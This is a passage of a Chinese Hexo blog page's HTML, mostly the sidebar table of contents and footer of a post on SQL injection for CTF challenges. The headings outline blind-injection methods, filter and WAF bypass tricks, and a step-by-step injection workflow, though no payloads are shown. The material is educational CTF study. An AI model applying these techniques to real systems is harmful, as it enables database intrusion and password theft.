nav-level-6"><a class="nav-link" href="#即对某一列进行排序，默认是升序排列，即后面默认跟上asc，那么上面一句就相当于："><span class="nav-number">1.1.5.2.</span> <span class="nav-text">即对某一列进行排序，默认是升序排列，即后面默认跟上asc，那么上面一句就相当于：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们在注入时经常会使用order-by来判断数据库的列数，那我们这里使用他配合union-select来进行注入。"><span class="nav-number">1.1.5.3.</span> <span class="nav-text">我们在注入时经常会使用order by来判断数据库的列数，那我们这里使用他配合union select来进行注入。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-原理分析"><span class="nav-number">1.1.6.</span> <span class="nav-text">2. 原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们现在的目的是要注出liyu用户的password值。"><span class="nav-number">1.1.6.1.</span> <span class="nav-text">我们现在的目的是要注出liyu用户的password值。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接着我们在语句后面加上order-by-4，即对第四列进行升序排序-按照ascii码表"><span class="nav-number">1.1.6.2.</span> <span class="nav-text">接着我们在语句后面加上order by 4，即对第四列进行升序排序(按照ascii码表)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里的password列中4是我们union-select里面的第四列，这里就把-39-4-39-替换为-39-1-39-。"><span class="nav-number">1.1.6.3.</span> <span class="nav-text">这里的password列中4是我们union select里面的第四列，这里就把&#39;4&#39;替换为&#39;1&#39;。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以看到liyu用户跑到第一行来了，所以这里经常用来判断由返回差异的注入，且返回只有一列的输出，根据差异来判断我们的盲注值是否正确。"><span class="nav-number">1.1.6.4.</span> <span class="nav-text">我们可以看到liyu用户跑到第一行来了，所以这里经常用来判断由返回差异的注入，且返回只有一列的输出，根据差异来判断我们的盲注值是否正确。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-使用场景"><span class="nav-number">1.1.7.</span> <span class="nav-text">3. 使用场景</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x04-实例讲解"><span class="nav-number">1.1.8.</span> <span class="nav-text">0x04 实例讲解</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-ascii盲注来自skctf-login3的一道题目："><span class="nav-number">1.1.8.1.</span> <span class="nav-text">1. ascii盲注来自skctf login3的一道题目：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#题目链接：http-123-206-31-85-49167"><span class="nav-number">1.1.8.2.</span> <span class="nav-text">题目链接：http://123.206.31.85:49167/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里最后是要注入出admin的password，过程就不详细讲解了，直接给出payload："><span class="nav-number">1.1.8.3.</span> <span class="nav-text">这里最后是要注入出admin的password，过程就不详细讲解了，直接给出payload：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面是脚本："><span class="nav-number">1.1.8.4.</span> <span class="nav-text">下面是脚本：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-regex-盲注是来自实验吧的一道注入题目："><span class="nav-number">1.1.9.</span> <span class="nav-text">2. regex 盲注是来自实验吧的一道注入题目：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#题目链接：http-ctf5-shiyanbar-com-web-earnest-index-php"><span class="nav-number">1.1.9.1.</span> <span class="nav-text">题目链接：http://ctf5.shiyanbar.com/web/earnest/index.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这道题只有一个id作为输入点，id存在注入点，但是过滤了很多东西，前面的步骤就不详细说了，去看p牛的详细解答看到这里，过滤了-，但是没过滤-，所以xor注入就无效了，这边选择regexp注入使用-符号从后往前注入。"><span class="nav-number">1.1.9.2.</span> <span class="nav-text">这道题只有一个id作为输入点，id存在注入点，但是过滤了很多东西，前面的步骤就不详细说了，去看p牛的详细解答看到这里，过滤了^，但是没过滤$，所以xor注入就无效了，这边选择regexp注入使用$符号从后往前注入。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面是另外一种方法："><span class="nav-number">1.1.9.3.</span> <span class="nav-text">下面是另外一种方法：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x04-其他的一些小tips"><span class="nav-number">1.1.10.</span> <span class="nav-text">0x04 其他的一些小tips</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-一些等效替代的函数-特殊符号"><span class="nav-number">1.1.11.</span> <span class="nav-text">1.一些等效替代的函数(特殊符号)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#字符："><span class="nav-number">1.1.11.1.</span> <span class="nav-text">字符：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#函数："><span class="nav-number">1.1.11.2.</span> <span class="nav-text">函数：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-一次性报所有表明和字段名"><span class="nav-number">1.1.12.</span> <span class="nav-text">2. 一次性报所有表明和字段名</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#3-Subquery-returns-more-than-1-row的解决方法"><span class="nav-number">1.1.12.1.</span> <span class="nav-text">3. Subquery returns more than 1 row的解决方法</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#产生这个问题的原因是子查询多于一列，也就是显示为只有一列的情况下，没有使用limit语句限制，就会产生这个问题，即limt-0-1"><span class="nav-number">1.1.12.2.</span> <span class="nav-text">产生这个问题的原因是子查询多于一列，也就是显示为只有一列的情况下，没有使用limit语句限制，就会产生这个问题，即limt 0,1</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果我们这里的逗号被过滤了咋办？那就使用offset关键字："><span class="nav-number">1.1.12.3.</span> <span class="nav-text">如果我们这里的逗号被过滤了咋办？那就使用offset关键字：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果我们这里的limit被过滤了咋办？那就试试下面的几种方法："><span class="nav-number">1.1.12.4.</span> <span class="nav-text">如果我们这里的limit被过滤了咋办？那就试试下面的几种方法：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-join注入"><span class="nav-number">1.1.13.</span> <span class="nav-text">4. join注入</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#payload"><span class="nav-number">1.1.13.1.</span> <span class="nav-text">payload:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#优势：过滤了逗号的情况下使用"><span class="nav-number">1.1.13.2.</span> <span class="nav-text">优势：过滤了逗号的情况下使用</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面的payload-别的博客处摘抄来的-适用于过滤了逗号和字段名的情况下使用"><span class="nav-number">1.1.13.3.</span> <span class="nav-text">下面的payload(别的博客处摘抄来的)适用于过滤了逗号和字段名的情况下使用</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-带-的注入"><span class="nav-number">1.1.14.</span> <span class="nav-text">5. 带!的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#直接看下面的payload，适用于and、or、-被过滤的情况下使用，有时候可能也会使用到，但是具体的原理不是很明白，大家可以自行google"><span class="nav-number">1.1.14.1.</span> <span class="nav-text">直接看下面的payload，适用于and、or、^被过滤的情况下使用，有时候可能也会使用到，但是具体的原理不是很明白，大家可以自行google</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-if盲注-合理利用条件"><span class="nav-number">1.1.15.</span> <span class="nav-text">6. if盲注(合理利用条件)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#if盲注的基本格式："><span class="nav-number">1.1.15.1.</span> <span class="nav-text">if盲注的基本格式：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-2"><span class="nav-number">1.1.15.2.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下："><span class="nav-number">1.1.15.3.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#用好if盲注的关键是条件的输入，有一道BCTF的注入题的wp用的就是if盲注"><span class="nav-number">1.1.15.4.</span> <span class="nav-text">用好if盲注的关键是条件的输入，有一道BCTF的注入题的wp用的就是if盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#wp链接：https-www-kingkk-com-2018-04-bctf2018-love-q"><span class="nav-number">1.1.15.5.</span> <span class="nav-text">wp链接：https://www.kingkk.com/2018/04/bctf2018-love-q/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#写博客的这位大佬巧妙利用了pow函数数值溢出的特性，使得经过if判断后的条件会报错，但是不执行该语句时语法上是没问题的"><span class="nav-number">1.1.15.6.</span> <span class="nav-text">写博客的这位大佬巧妙利用了pow函数数值溢出的特性，使得经过if判断后的条件会报错，但是不执行该语句时语法上是没问题的</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#原理如下："><span class="nav-number">1.1.15.7.</span> <span class="nav-text">原理如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第一个语句为条件为真，后面一个为假。"><span class="nav-number">1.1.15.8.</span> <span class="nav-text">第一个语句为条件为真，后面一个为假。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#像利用pow这种函数溢出的特性也不止这一个，这就需要我们靠平时的经验积累了，总之想要玩好ctf的注入题途径就是多刷题。"><span class="nav-number">1.1.15.9.</span> <span class="nav-text">像利用pow这种函数溢出的特性也不止这一个，这就需要我们靠平时的经验积累了，总之想要玩好ctf的注入题途径就是多刷题。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x06-自己总结的注入流程"><span class="nav-number">1.1.16.</span> <span class="nav-text">0x06 自己总结的注入流程</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1、先找到注入点，id-，username-，判断GET-POST-COOKIE注入"><span class="nav-number">1.1.16.1.</span> <span class="nav-text">1、先找到注入点，id=，username=，判断GET/POST/COOKIE注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示"><span class="nav-number">1.1.16.2.</span> <span class="nav-text">2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3、判断字符型注入还是数字型注入（2-1，’是否正常）"><span class="nav-number">1.1.16.3.</span> <span class="nav-text">3、判断字符型注入还是数字型注入（2-1，’是否正常）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））"><span class="nav-number">1.1.16.4.</span> <span class="nav-text">4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5、先简单测试空格和注释符是否被替换了，id-1-1，id-1-231（看看能否用-、-20、-0a、-09绕过）"><span class="nav-number">1.1.16.5.</span> <span class="nav-text">5、先简单测试空格和注释符是否被替换了，id=1 1，id = 1%231（看看能否用/ /、%20、%0a、%09绕过）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#6、进行fuzz，看看那些被waf了"><span class="nav-number">1.1.16.6.</span> <span class="nav-text">6、进行fuzz，看看那些被waf了</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#7、若页面上没有显示waf过滤之类的提示（sql-injection-detected），就测试是否有被替换为空的字符（如：’-or-‘-’-’、’-or-‘-‘-’-，如果页面返回正常的话，则说明该字符被替换为空）"><span class="nav-number">1.1.16.7.</span> <span class="nav-text">7、若页面上没有显示waf过滤之类的提示（sql injection detected），就测试是否有被替换为空的字符（如：’ or ‘*’=’、’ or ‘-‘=’ ，如果页面返回正常的话，则说明该字符被替换为空）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过"><span class="nav-number">1.1.16.8.</span> <span class="nav-text">8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注"><span class="nav-number">1.1.16.9.</span> <span class="nav-text">9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10、先在bp中跑一遍看是否有结果"><span class="nav-number">1.1.16.10.</span> <span class="nav-text">10、先在bp中跑一遍看是否有结果</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#11、尝试写脚本"><span class="nav-number">1.1.16.11.</span> <span class="nav-text">11、尝试写脚本</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最重要的两步就是注入点并判断出注入类型，找到被过滤的函数和关键字并找到替代的函数和关键字，这就需要我们靠自己的耐心和细心还有经验的积累了。"><span class="nav-number">1.1.16.12.</span> <span class="nav-text">最重要的两步就是注入点并判断出注入类型，找到被过滤的函数和关键字并找到替代的函数和关键字，这就需要我们靠自己的耐心和细心还有经验的积累了。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x07-结束语"><span class="nav-number">1.1.17.</span> <span class="nav-text">0x07 结束语</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#上面的说的那些盲注手法都是在union注入、报错注入和可回显注入都失效的情况下使用的，所以说盲注是一种通法，他也是放在最后使用的方法，如果本来环境就存在回显的点可以用union直接注入出来，还使用盲注显的有点多此一举，也浪费很多时间。所以这些方法需要根据大家遇到的实际情况进行灵活运用。"><span class="nav-number">1.1.17.1.</span> <span class="nav-text">上面的说的那些盲注手法都是在union注入、报错注入和可回显注入都失效的情况下使用的，所以说盲注是一种通法，他也是放在最后使用的方法，如果本来环境就存在回显的点可以用union直接注入出来，还使用盲注显的有点多此一举，也浪费很多时间。所以这些方法需要根据大家遇到的实际情况进行灵活运用。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x08-其他一些不错的参考文章"><span class="nav-number">1.1.18.</span> <span class="nav-text">0x08 其他一些不错的参考文章</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#SQL注入绕过技巧"><span class="nav-number">1.1.18.1.</span> <span class="nav-text">SQL注入绕过技巧</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#SQLi-filter-evasion-cheat-sheet"><span class="nav-number">1.1.18.2.</span> <span class="nav-text">SQLi filter evasion cheat sheet</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我的WafBypass之道（SQL注入篇）"><span class="nav-number">1.1.18.3.</span> <span class="nav-text">我的WafBypass之道（SQL注入篇）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#sql-盲注之正则表达式攻击"><span class="nav-number">1.1.18.4.</span> <span class="nav-text">sql 盲注之正则表达式攻击</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#mysql无逗号的注入技巧"><span class="nav-number">1.1.18.5.</span> <span class="nav-text">mysql无逗号的注入技巧</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#fuzz字典"><span class="nav-number">1.1.18.6.</span> <span class="nav-text">fuzz字典</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">58.2k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
